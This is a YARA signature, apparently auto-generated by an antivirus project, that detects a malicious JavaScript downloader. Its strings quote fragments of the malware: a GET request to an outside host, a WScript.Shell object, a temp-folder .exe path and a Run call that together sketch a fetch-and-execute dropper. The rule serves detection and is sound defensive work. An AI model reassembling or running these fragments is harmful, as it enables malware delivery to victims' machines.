rule sig_20160401_e20b266f5aa04b37ea04df951e00b5f4 {
  meta:
    description = "datamaliciousorder - file 20160401_e20b266f5aa04b37ea04df951e00b5f4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b9e56c8baaec7da25eca018be748d33132409cb113e48f81bcb390491c780c5c"

  strings:
    $s1  = "OnkZo[VfZr](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "function LtJhb(OhUmy, XsRyo){YyGb = YyGb * 1; return OhUmy - XsRyo;};" fullword ascii
    $s3  = "var OvzUn = function DwCiq() {return WScript[BlzMb](\"WScript\"+\".Shell\");}(), GfwJhz = 11;" fullword ascii
    $s4  = "if (OnkZo[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function HgVs(){return HnrRi + \"\";};" fullword ascii
    $s6  = "function WxoKk() {return OvzUn[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JWL1OAMhEttQS.ex\" + \"e\";};" fullword ascii
    $s7  = "function CgrRjk() {return ((KiBk == true) && (KiBk == AbNl)) ? 1 : YyGb;};" fullword ascii
    $s8  = "function YqfCsv(PtNqz){OvzUn[\"R\"+\"un\"](PtNqz, YyGb, YyGb);};" fullword ascii
    $s9  = "return LtJhb(ZzGji, RfeKu);" fullword ascii
    $s10 = "AbNl = true; " fullword ascii
    $s11 = "var SoJc = new this[\"Date\"]();" fullword ascii
    $s12 = "var AbNl = false;" fullword ascii
    $s13 = "}while (CtGxw);" fullword ascii
    $s14 = "function DoqOp(){return 23;};" fullword ascii
    $s15 = "function FuxOy(RbgZvk) {var BzGz = (1, 2, 3, 4, 5, RbgZvk); return BzGz;};" fullword ascii
    $s16 = "var KiBk = false;" fullword ascii
    $s17 = "function SlpLos()" fullword ascii
    $s18 = "KiBk = true; " fullword ascii
    $s19 = "var OqsWn = false;" fullword ascii
    $s20 = "function JvtRak(){return BlzMb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}